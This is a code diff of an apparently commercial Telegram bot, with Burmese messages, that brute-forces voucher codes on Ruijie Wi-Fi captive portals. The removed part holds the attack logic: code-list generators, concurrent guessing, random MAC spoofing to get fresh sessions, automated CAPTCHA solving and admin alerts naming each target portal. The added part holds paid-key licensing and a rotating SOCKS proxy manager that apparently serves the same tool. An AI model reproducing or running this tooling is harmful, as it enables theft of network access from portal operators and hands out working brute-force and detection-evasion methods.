-            message,
-            f"✅ Key Deleted\n\nUSER ID : {user_id}"
-        )
-    except Exception as e:
-        print(f"Error at delkey {e}")
 
-@bot.message_handler(commands=['genkey'])
-async def genkey(message):
-    if not is_admin(message.chat.id):
-        await bot.reply_to(message, "No Permission")
-        return
-    try:
-        args = message.text.split()
-        if len(args) < 3:
-            await bot.reply_to(message, "Usage:\n/genkey unlimited 123456789")
-            return
-        plan = args[1]
-        user_id = args[2]
-        expiry = generate_expiry(plan)
-        if not expiry:
-            await bot.reply_to(
-                message,
-                "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited"
-            )
-            return
-        auth_list, sha = await get_file_content("auth_list.json")
-        auth_list[user_id] = {
-            "expires_at": expiry,
-            "plan": plan
-        }
-        await update_file_content(
-            "auth_list.json",
-            auth_list,
-            sha,
-            f"Add key for {user_id}"
-        )
-        await bot.reply_to(
-            message,
-            f"✅ Key Generated\n\n"
-            f"USER ID : {user_id}\n"
-            f"PLAN : {plan}\n"
-            f"EXPIRES : {expiry}"
-        )
-    except Exception as e:
-        print(f"Error at genkey {e}")
-
-@bot.message_handler(commands=['result'])
-async def handle_result(message):
-    user_id = str(message.chat.id)
-    if user_id not in paid_users and user_id not in approve:
-        await bot.reply_to(message, f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။")
-        return
-    
-    results, _ = await get_file_content("result.json")
-    chat_id_str = str(message.chat.id)
-    if chat_id_str in results and results[chat_id_str]:
-        codes = "\n".join(results[chat_id_str])
-        await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
-    else:
-        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")
-
-def check_key_expiration(expiration_time):
-    try:
-        if isinstance(expiration_time, dict):
-            expiry = expiration_time.get("expires_at")
-            if expiry == "9999-12-31T23:59:59Z":
-                return True
-            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
-            return datetime.now(timezone.utc) < exp_time
-        mm, hh, dd, MM, yyyy = map(
-            int,
-            expiration_time.split('-')
-        )
-        expiration_dt = datetime(
-            year=yyyy,
-            month=MM,
-            day=dd,
-            hour=hh,
-            minute=mm,
-            second=0,
-            tzinfo=timezone.utc
-        )
-        return datetime.now(timezone.utc) < expiration_dt
-    except Exception as e:
-        print("Key parse error:", e)
-        return False
-
-def generate_expiry(plan):
-    now = datetime.now(timezone.utc)
-    plans = {
-        "30m": timedelta(minutes=30),
-        "1h": timedelta(hours=1),
-        "1d": timedelta(days=1),
-        "7d": timedelta(days=7),
-        "1m": timedelta(days=30),
-        "1y": timedelta(days=365),
-        "unlimited": None
-    }
-    if plan not in plans:
-        return None
-    if plan == "unlimited":
-        return "9999-12-31T23:59:59Z"
-    return (now + plans[plan]).isoformat()
-
-def get_current_time():
-    return datetime.now(timezone.utc)
-
-@bot.message_handler(commands=['recheck'])
-async def recheck(message):
-    chat_id = message.chat.id
-    user_id = str(chat_id)
-    
-    if user_id not in paid_users and user_id not in approve:
-        await bot.reply_to(message, f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {@mzw199761} သို့ ဆက်သွယ်ပါ။")
-        return
-    
-    results, sha = await get_file_content("result.json")
-    chat_id_str = str(message.chat.id)
-    if chat_id_str in results and results[chat_id_str]:
-        if message.chat.id not in user_data:
-            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
-            return
-        if "session_url" not in user_data.get(message.chat.id, {}):
-            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
-            return
-        codes = results[chat_id_str]
-        await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
-        session_url_recheck = user_data[message.chat.id]["session_url"]
-        recheck_list = []
-        for code in codes:
-            recode = await perform_check(
-                session_url_recheck,
-                code,
-                chat_id,
-                scan_id=None,
-                recheck=True,
-                message=message
-            )
-            if recode:
-                recheck_list.append(recode)
-        to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
-        await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
-        await save_rechecked_codes(chat_id_str, recheck_list, sha)
-    else:
-        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
-
-async def save_rechecked_codes(chat_id_str, recheck_list, sha):
-    results, _ = await get_file_content("result.json")
-    results[chat_id_str] = recheck_list
-    await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")
-
-@bot.message_handler(commands=['portal'])
-async def handle_portal(message):
-    user_id = str(message.chat.id)
-    
-    if user_id not in paid_users and user_id not in approve:
-        await bot.reply_to(message, f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {@mzw199761} သို့ ဆက်သွယ်ပါ။")
-        return
-    
-    args = message.text.split(maxsplit=1)
-    if len(args) < 2:
-        await bot.reply_to(
-            message,
-            "🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]\n\nဥပမာ:\n/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00"
-        )
-        return
-    url = args[1]
-    
-    if message.chat.id not in user_data:
-        user_data[message.chat.id] = {}
-    
-    await bot.reply_to(message, "🔗 Portal URL အားစစ်ဆေးနေပါသည်...")
-    
-    if await check_session_url_improved(session_url=url):
-        user_data[message.chat.id]['session_url'] = url
-        await bot.reply_to(
-            message, 
-            "✅ Portal URL အားသိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
-            reply_markup=get_voucher_keyboard()
-        )
-    else:
-        await bot.reply_to(
-            message, 
-            f"❌ Portal URL မှားယွင်းနေပါသည်။ ကျေးဇူးပြု၍ ပြန်လည်စစ်ဆေးပါ။\n\n"
-            f"✅ မှန်ကန်တဲ့ URL ပုံစံ:\n"
-            f"`https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00`",
-            parse_mode="Markdown"
-        )
-
-async def check_session_url_improved(session_url, use_proxy=False):
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    }
-    
-    proxy = get_next_proxy() if use_proxy else None
-    
-    try:
-        async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy, timeout=15) as response:
-            if response.status >= 400:
-                return False
-            
-            final_url = str(response.url)
-            response_text = await response.text()
-            
-            if "sessionId" in final_url or "sessionId" in response_text:
-                return True
-            
-            portal_indicators = [
-                "portal-as.ruijienetworks.com",
-                "maccauth",
-                "index.html",
-                "sessionId",
-                "lang=en_US"
-            ]
-            
-            for indicator in portal_indicators:
-                if indicator in final_url or indicator in response_text:
-                    return True
-            
-            session_patterns = [
-                r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)',
-                r'["\']sessionId["\']\s*:\s*["\']([a-zA-Z0-9]+)',
-                r'[?&]sessionId=([a-zA-Z0-9]+)'
-            ]
-            
-            for pattern in session_patterns:
-                if re.search(pattern, response_text, re.IGNORECASE):
-                    return True
-                if re.search(pattern, final_url, re.IGNORECASE):
-                    return True
-            
-            if "portal" in response_text.lower() or "captcha" in response_text.lower():
-                return True
-            
-            return False
-            
-    except asyncio.TimeoutError:
-        print(f"Portal check timeout for URL: {session_url}")
-        return False
-    except Exception as e:
-        print(f"Portal check error: {e}")
-        return False
-
-@bot.message_handler(commands=['scan'])
-async def handle_key_scan(message):
-    args = message.text.split(maxsplit=1)
-    if len(args) < 2:
-        await bot.reply_to(
-            message,
-            "VOUCHER ရွေးချယ်ရန်:\n\n/scan 6, 7, 8, 9, ascii-lower, ascii-lower9, all, mixed, mixed8, mixed9",
-            reply_markup=get_voucher_keyboard()
-        )
-        return
-    mode = args[1]
-    chat_id = message.chat.id
-    user_id = str(chat_id)
-    
-    if user_id not in paid_users and user_id not in approve:
-        await bot.reply_to(
-            message,
-            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။"
-        )
-        return
-    
-    if chat_id not in user_data:
-        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
-        return
-    if 'session_url' not in user_data[chat_id]:
-        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
-        return
-
-    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
-        await bot.reply_to(message, "Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။")
-        return
-
-    progress_msg = await bot.send_message(chat_id, "🔍 Voucher Codeရှာဖွေနေသည်...\n\n")
-    scan_id = str(uuid.uuid4())
-    
-    try:
-        user_name = message.from_user.first_name or message.from_user.username or "User"
-        portal_url = user_data[chat_id].get('session_url', 'Unknown')
-        last_url = user_data[chat_id].get('last_admin_notified_url', '')
-        
-        if portal_url != last_url and portal_url != 'Unknown':
-            admin_msg = f"🚀 **Scan Start Notification (/scan)**\n\n🪪 **User:** {user_name}\n📜 **User ID:** `{user_id}`\n🔢 **Mode:** {mode}\n🔗 **Portal URL:**\n`{portal_url}`"
-            for admin_id in ADMINS:
-                try:
-                    await bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
-                except:
-                    pass
-            user_data[chat_id]['last_admin_notified_url'] = portal_url
-    except Exception as e:
-        print(f"Admin Notification Error in /scan: {e}")
-
-    task = asyncio.create_task(
-        run_bruteforce(
-            mode,
-            chat_id,
-            user_data[chat_id]['session_url'],
-            scan_id,
-            message=message,
-            progress_msg=progress_msg
-        )
-    )
-
-    scan_tasks[chat_id] = {
-        "task": task,
-        "stop": False,
-        "scan_id": scan_id
-    }
-
-@bot.message_handler(commands=['status'])
-async def status(message):
-    if not is_admin(message.chat.id):
-        await bot.reply_to(message, "No Permission")
-        return
-    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
-    approved_users = len(paid_users) + sum(1 for v in approve.values() if v)
-    uptime_seconds = int(time.monotonic() - _start_time)
-    hours, remainder = divmod(uptime_seconds, 3600)
+def display_remaining_time(expiry_date):
+    now = datetime.datetime.now()
+    remaining = int(max((expiry_date - now).total_seconds(), 0))
+    days, remainder = divmod(remaining, 86400)
+    hours, remainder = divmod(remainder, 3600)
     minutes, seconds = divmod(remainder, 60)
-    await bot.reply_to(
-        message,
-        f"🪫 Bot Status\n\n"
-        f"⏳ Uptime: {hours}h {minutes}m {seconds}s\n"
-        f"🔍 Active Scans: {active_scans}\n"
-        f"🎫 PAID Users: {approved_users}\n"
-        f"👥 Sessions Loaded: {len(user_data)}"
-    )
-
-async def send_success_file(chat_id):
-    target_ids = ["6988969946", "1981253384", "1477223103"]
-    if str(chat_id) in target_ids and chat_id in success_texts and success_texts[chat_id]:
-        try:
-            filename = f"success_{chat_id}_{int(time.time())}.txt"
-            content = "\n".join(success_texts[chat_id])
-            with open(filename, "w", encoding="utf-8") as f:
-                f.write(content)
-            
-            with open(filename, "rb") as f:
-                await bot.send_document(chat_id, f, caption="✅ Scan ရပ်တန့်သွားသောကြောင့် ရရှိထားသော Success Codes များကို ဖိုင်အဖြစ် ပို့ပေးလိုက်ပါသည်။")
-            
-            if os.path.exists(filename):
-                os.remove(filename)
-        except Exception as e:
-            print(f"Error sending file: {e}")
-
-@bot.message_handler(commands=['stop'])
-async def stop_scan_command(message):
-    chat_id = message.chat.id
-    data = scan_tasks.get(chat_id)
-    if data and not data["task"].done():
-        data["stop"] = True
-        data["scan_id"] = None
-        await send_success_file(chat_id)
-        
-        data["task"].cancel()
-        success_messages.pop(chat_id, None)
-        success_texts.pop(chat_id, None)
-        limited_messages.pop(chat_id, None)
-        limited_texts.pop(chat_id, None)
-        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard())
+    if days:
+        time_str = f"{days} days {hours} hour {minutes} min"
+    elif hours:
+        time_str = f"{hours} hr {minutes} min"
     else:
-        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())
+        time_str = f"{minutes} min"
+    print(yellow + f"[*]  Pact Remaining: {time_str}  ")
+    print(f"[-] Pact Expiration: ({expiry_date.strftime('%Y-%m-%d %H:%M')}) " + reset)
 
-async def github_update_scheduler():
-    global SUCCESS_CODE
-    while True:
-        await asyncio.sleep(180)
-        items = []
-        while not SUCCESS_CODE.empty():
-            items.append(await SUCCESS_CODE.get())
-        if items:
-            try:
-                results, sha = await get_file_content("result.json")
-                for item in items:
-                    chat_id = str(item["chat_id"])
-                    code = item["code"]
-                    if chat_id not in results:
-                        results[chat_id] = []
-                    if code not in results[chat_id]:
-                        results[chat_id].append(code)
-                await update_file_content("result.json", results, sha, "Periodic Update")
-            except Exception as e:
-                print(f"Update Error: {e}")
 
-def digit_generator(length):
-    return "".join(random.choice(string.digits) for _ in range(length))
-
-strings = string.ascii_lowercase + string.digits
-def all_generator(length=6):
-    return "".join(random.choice(strings) for _ in range(length))
-
-strings_2 = string.ascii_lowercase
-def ascii_generator(length=6):
-    return "".join(random.choice(strings_2) for _ in range(length))
-
-strings_mixed = string.ascii_lowercase + string.digits
-def mixed_generator(length=6):
-    return "".join(random.choice(strings_mixed) for _ in range(length))
-
-def iter_codes(mode, start_digit=None):
-    if mode in ["6", "7", "8", "9"]:
-        length = int(mode)
-        if start_digit is not None:
-            start = int(start_digit) * (10 ** (length - 1))
-            end = (int(start_digit) + 1) * (10 ** (length - 1))
-            for i in range(start, end):
-                yield str(i).zfill(length)
-            return
-            
-        if mode in ["6", "7", "8"]:
-            codes = [str(i).zfill(length) for i in range(10 ** length)]
-            random.shuffle(codes)
-            yield from codes
-            return
-        if mode == "9":
-            while True:
-                yield digit_generator(9)
-            return
-    
-    if mode == "ascii-lower":
-        while True:
-            yield ascii_generator(6)
-    
-    if mode == "ascii-lower9":
-        while True:
-            yield ascii_generator(9)
-    
-    if mode == "all":
-        while True:
-            yield all_generator(6)
-    
-    if mode == "mixed":
-        while True:
-            yield mixed_generator(6)
-    
-    if mode == "mixed8":
-        while True:
-            yield mixed_generator(8)
-    
-    if mode == "mixed9":
-        while True:
-            yield mixed_generator(9)
-    
-    raise ValueError(f"Unsupported scan mode: {mode}")
-
-def format_progress(checked, total=None, speed=0, found=0):
-    speed_str = f"{speed:,.0f} codes/min"
-    if total is not None:
-        bar_length = 20
-        percent = (checked / total) * 100
-        filled = min(bar_length, int(percent / 5))
-        bar = "█" * filled + "░" * (bar_length - filled)
-        return (
-            f"🔍Voucher Codeရှာဖွေနေသည်...\n\n"
-            f"📦စစ်ဆေးနေသည် : {checked:,}/{total:,}\n"
-            f"📊Progress : {percent:.2f}%\n"
-            f"⚡အမြန်နှုန်း : {speed_str}\n"
-            f"✅Success code hit : {found}\n"
-            f"[{bar}]"
-        )
-    return (
-        f"🔍Voucher Codeရှာဖွေနေသည်...\n\n"
-        f"📦စစ်ဆေးနေသည် : {checked:,}\n"
-        f"⚡အမြန်နှုန်း : {speed_str}\n"
-        f"✅Success code hit : {found}\n"
-        f"📊Status : running\n"
-    )
-
-BATCH_SIZE = 1000
-
-def _captcha_entry(chat_id):
-    if chat_id not in captcha_state:
-        captcha_state[chat_id] = {
-            "session_id": None,
-            "auth_code": None,
-            "lock": asyncio.Lock(),
-        }
-    return captcha_state[chat_id]
-
-async def get_captcha(chat_id, session, session_url):
-    entry = _captcha_entry(chat_id)
-    if entry["session_id"] and entry["auth_code"]:
-        return entry["session_id"], entry["auth_code"]
-    async with entry["lock"]:
-        if entry["session_id"] and entry["auth_code"]:
-            return entry["session_id"], entry["auth_code"]
-        session_id = await get_session_id(session, session_url, entry.get("session_id"))
-        if not session_id:
-            return None, None
-        for _ in range(10):
-            image = await Captcha_Image(session, session_id)
-            text = await Captcha_Text(image)
-            verified = await Varify_Captcha(session, session_id, text)
-            if verified:
-                entry["session_id"] = session_id
-                entry["auth_code"] = text
-                return session_id, text
-        return None, None
-
-def invalidate_captcha(chat_id):
-    entry = _captcha_entry(chat_id)
-    entry["session_id"] = None
-    entry["auth_code"] = None
-
-async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
-    try:
-        code_iter = iter_codes(mode, start_digit=start_digit)
-    except ValueError as e:
-        await bot.send_message(chat_id, str(e))
+def check_approval():
+    if not os.path.exists(OWNER_LICENSE_FILE):
+        print(bgreen + "[+]  Portal Granted Access!" + reset)
         return
-    
-    if mode in ["6", "7", "8"]:
-        total = 10 ** int(mode)
-    elif mode == "9":
-        total = None
-    elif mode in ["mixed", "mixed8", "mixed9"]:
-        total = None
-    elif mode in ["ascii-lower", "ascii-lower9"]:
-        total = None
-    elif mode == "all":
-        total = None
-    else:
-        total = None
-    
-    checked = 0
-    last_key_check = time.monotonic()
-    scan_start = time.monotonic()
-    global _voucher_sem
-    if _voucher_sem is None:
-        _voucher_sem = asyncio.Semaphore(CONCURRENCY)
-
     try:
-        while True:
-            current_task = scan_tasks.get(chat_id)
-            if not current_task or current_task.get("scan_id") != scan_id:
-                return
-            if current_task.get("stop"):
-                scan_tasks.pop(chat_id, None)
-                success_messages.pop(chat_id, None)
-                success_texts.pop(chat_id, None)
-                return
-
-            batch = []
-            for _ in range(BATCH_SIZE):
-                try:
-                    batch.append(next(code_iter))
-                except StopIteration:
-                    break
-            if not batch:
-                break
-
-            if time.monotonic() - last_key_check >= 600:
-                auth_list, _ = await get_file_content("auth_list.json")
-                if str(chat_id) not in auth_list and str(chat_id) not in paid_users:
-                    approve[chat_id] = False
-                    await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
-                    scan_tasks.pop(chat_id, None)
-                    success_messages.pop(chat_id, None)
-                    success_texts.pop(chat_id, None)
+        with open(OWNER_LICENSE_FILE) as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                parts = line.split(":")
+                if len(parts) >= 2:
+                    expiry_str = ":".join(parts[1:])
+                    try:
+                        expiry_date = datetime.datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
+                    except ValueError:
+                        continue
+                    if datetime.datetime.now() >= expiry_date:
+                        print(bred + f"[!] OWNER  LICENSE EXPIRED" + reset)
+                        sys.exit(1)
+                    print(bgreen + "[+]  Portal Granted Access!" + reset)
+                    display_remaining_time(expiry_date)
                     return
-                last_key_check = time.monotonic()
+    except Exception as e:
+        print(yellow + f"[License]  Error: {e}" + reset)
+    print(bgreen + "[+]  Portal Granted Access!" + reset)
 
-            async def _check(code):
-                async with _voucher_sem:
-                    return await perform_check(session_url, code, chat_id, scan_id, message=message)
 
-            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
-            checked += len(batch)
+# ==============================================================================
+#  PAID KEY SYSTEM
+# ==============================================================================
 
-            found = len(success_texts.get(chat_id, []))
-            elapsed = time.monotonic() - scan_start
-            speed = (checked / elapsed * 60) if elapsed > 0 else 0
-            
-            if total is not None:
-                text = format_progress(checked, total, speed, found)
-            else:
-                text = format_progress(checked, None, speed, found)
-            
-            try:
-                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
-            except Exception:
-                try:
-                    new_msg = await bot.send_message(chat_id, text)
-                    progress_msg.message_id = new_msg.message_id
-                except Exception as err:
-                    print(f"Progress Message Error: {err}")
-
-        if progress_msg:
-            found = len(success_texts.get(chat_id, []))
-            if total is not None:
-                finish_text = "🔍ရှာဖွေမှုပြီးဆုံးပါပြီီ\n\n" + f"📦စစ်ဆေးမှူ : {checked:,}/{total:,}\n✅ ရှာတွေ့ထားသောCode: {found}\n📊Progress : 100%\n[██████████████████]"
-            else:
-                finish_text = "🔍ရှာဖွေမှုပြီးဆုံးပါပြီ\n\n" + f"📦စစ်ဆေးမှု : {checked:,}\n✅ ရှာတွေ့ထားသောCode: {found}\n📊Progress : 100%\n[██████████████████]"
-            try:
-                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
-            except:
-                try:
-                    await bot.send_message(chat_id, finish_text)
-                except Exception as err:
-                    print(f"Progress Finish Message Error: {err}")
-        await send_success_file(chat_id)
-        
-        scan_tasks.pop(chat_id, None)
-        success_messages.pop(chat_id, None)
-        success_texts.pop(chat_id, None)
-        limited_messages.pop(chat_id, None)
-        limited_texts.pop(chat_id, None)
-    finally:
-        await send_success_file(chat_id)
-        
-        scan_tasks.pop(chat_id, None)
-        success_messages.pop(chat_id, None)
-        success_texts.pop(chat_id, None)
-        limited_messages.pop(chat_id, None)
-        limited_texts.pop(chat_id, None)
-        global active_scans_count, active_scans_lock
-        async with active_scans_lock:
-            active_scans_count = max(0, active_scans_count - 1)
-
-def get_mac():
-    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
-    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
-    return ':'.join(f'{x:02x}' for x in mac)
-
-async def get_session_id(session, session_url, previous_session_id=None):
-    mac = get_mac()
-    session_url = replace_mac(session_url, new_mac=mac)
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'priority': 'u=0, i',
-        'referer': session_url,
-        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
-        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
-    }
-    
-    proxy = None
-    
+def parse_key_line(line):
+    line = line.strip()
+    if not line or line.startswith("#"):
+        return None
     try:
-        async with session.get(session_url, headers=headers, allow_redirects=True, proxy=proxy) as req:
-            response = str(req.url)
-            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
-            if session_id:
-                return session_id.group(1)
-            return previous_session_id
-    except:
-        return previous_session_id
+        first_colon = line.index(":")
+        key_hash = line[:first_colon]
+        rest = line[first_colon+1:]
+        last_colon = rest.rindex(":")
+        signature = rest[last_colon+1:]
+        rest2 = rest[:last_colon]
+        second_last = rest2.rindex(":")
+        plan = rest2[second_last+1:]
+        expiry_str = rest2[:second_last]
+        return {"key_hash": key_hash, "expiry": expiry_str, "plan": plan, "signature": signature}
+    except (ValueError, IndexError):
+        return None
+
+
+def load_paid_keys_local():
+    keys = {}
+    if not os.path.exists(PAID_KEYS_FILE):
+        try:
+            with open(PAID_KEYS_FILE, "w") as f:
+                f.write("# Format: <key_hash>:<expiry>:<plan>:<signature>\n")
+        except OSError:
+            pass
+        return keys
+    try:
+        with open(PAID_KEYS_FILE) as f:
+            for line in f:
+                entry = parse_key_line(line)
+                if not entry:
+                    continue
+                if encrypt_key_data(entry["key_hash"], entry["expiry"]) != entry["signature"]:
+                    continue
+                keys[entry["key_hash"]] = {"expiry": entry["expiry"], "plan": entry["plan"]}
+        print(bgreen + f"[PaidKeys]  Seal Loaded {len(keys)} Keys" + reset)
+    except Exception as e:
+        print(bred + f"[PaidKeys] Load Error: {e}" + reset)
+    return keys
+
+
+def validate_paid_key(user_key):
+    if not user_key:
+        return None
+    user_key = user_key.strip()
+    if len(user_key) < 8:
+        return None
+    keys = load_paid_keys_local()
+    if not keys:
+        return None
+    key_hash = hashlib.sha256(user_key.encode()).hexdigest()[:32]
+    entry = keys.get(key_hash)
+    if not entry:
+        return None
+    try:
+        expiry_date = datetime.datetime.strptime(entry["expiry"], "%Y-%m-%d %H:%M:%S")
+    except (ValueError, KeyError):
+        return None
+    if datetime.datetime.now() >= expiry_date:
+        return {"valid": False, "reason": "expired", "expiry": expiry_date}
+    return {"valid": True, "expiry": expiry_date, "plan": entry.get("plan", "paid")}
+
+
+def is_user_authorized(user_id):
+    if user_id in ADMIN_IDS:
+        return True
+    entry = paid_users.get(user_id)
+    if not entry:
+        return False
+    if datetime.datetime.now() >= entry["expiry"]:
+        return False
+    return True
+
+
+def is_admin(user_id):
+    return user_id in ADMIN_IDS
+
+
+def register_paid_user(user_id, key, expiry, plan):
+    paid_users[user_id] = {"key": key, "expiry": expiry, "plan": plan}
+    try:
+        data = {}
+        if os.path.exists(PAID_KEYS_FILE + ".users"):
+            try:
+                with open(PAID_KEYS_FILE + ".users") as f:
+                    data = json.load(f)
+            except Exception:
+                data = {}
+        data[str(user_id)] = {"key": key, "expiry": expiry.strftime("%Y-%m-%d %H:%M:%S"), "plan": plan}
+        with open(PAID_KEYS_FILE + ".users", "w") as f:
+            json.dump(data, f, indent=2)
+    except OSError:
+        pass
+
+
+def load_registered_users():
+    fpath = PAID_KEYS_FILE + ".users"
+    if not os.path.exists(fpath):
+        return
+    try:
+        with open(fpath) as f:
+            data = json.load(f)
+        for uid_str, entry in data.items():
+            try:
+                expiry = datetime.datetime.strptime(entry["expiry"], "%Y-%m-%d %H:%M:%S")
+            except (ValueError, KeyError):
+                continue
+            if datetime.datetime.now() < expiry:
+                paid_users[int(uid_str)] = {"key": entry.get("key", ""), "expiry": expiry, "plan": entry.get("plan", "paid")}
+        print(bgreen + f"[PaidUsers]  Realm Restored {len(paid_users)} Souls" + reset)
+    except Exception as e:
+        print(yellow + f"[PaidUsers] Load error: {e}" + reset)
+
+
+# ==============================================================================
+#  PROXY MANAGER
+# ==============================================================================
+
+class ProxyManager:
+    def __init__(self, file_path):
+        self.file_path = file_path
+        self.proxies = []
+        self.bad_proxies = []
+        self.fail_counts = {}
+        self.MAX_FAILS = PROXY_MAX_FAILS
+        self.lock = asyncio.Lock()
+        self.index = 0
+        self.load()
+
+    def _normalize(self, proxy):
+        proxy = (proxy or "").strip()
+        if not proxy or proxy.startswith("#"):
+            return None
+        if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
+            proxy = "socks5://" + proxy
+        return proxy
+
+    def _validate_proxy_format(self, proxy):
+        try:
+            rest = proxy.split("://", 1)[1] if "://" in proxy else proxy
+            if "@" in rest:
+                rest = rest.split("@", 1)[1]
+            if ":" not in rest:
+                return False
+            host, port = rest.rsplit(":", 1)
+            if not host or not port:
+                return False
+            port_num = int(port)
+            return 1 <= port_num <= 65535
+        except Exception:
+            return False
+
+    def load(self):
+        try:
+            if not os.path.exists(self.file_path):
+                with open(self.file_path, "w") as f:
+                    f.write("")
+                self.proxies = []
+                self.bad_proxies = []
+                self.fail_counts = {}
+                return
+            with open(self.file_path) as f:
+                raw = f.read().splitlines()
+            valid = []
+            invalid_count = 0
+            for line in raw:
+                p = self._normalize(line)
+                if p and self._validate_proxy_format(p):
+                    valid.append(p)
+                elif p:
+                    invalid_count += 1
+            seen = set()
+            self.proxies = []
+            for p in valid:
+                if p not in seen:
+                    seen.add(p)
+                    self.proxies.append(p)
+            random.shuffle(self.proxies)
+            self.bad_proxies = []
+            self.fail_counts = {}
+            msg = f"[ProxyManager]  Proxies Summoned: {len(self.proxies)}"
+            if invalid_count:
+                msg += f" ({invalid_count} Banished)"
+            print(bgreen + msg + reset)
+        except Exception as e:
+            print(bred + f"[ProxyManager] Error: {e}" + reset)
+
+    def reload(self):
+        self.load()
+
+    def add_proxies(self, proxy_lines):
+        added = 0
+        invalid = 0
+        for line in proxy_lines:
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+            p = self._normalize(line)
+            if not p or not self._validate_proxy_format(p):
+                invalid += 1
+                continue
+            if p in self.proxies:
+                continue
+            if p in self.bad_proxies:
+                self.bad_proxies.remove(p)
+            self.proxies.append(p)
+            self.fail_counts[p] = 0
+            added += 1
+        if added:
+            random.shuffle(self.proxies)
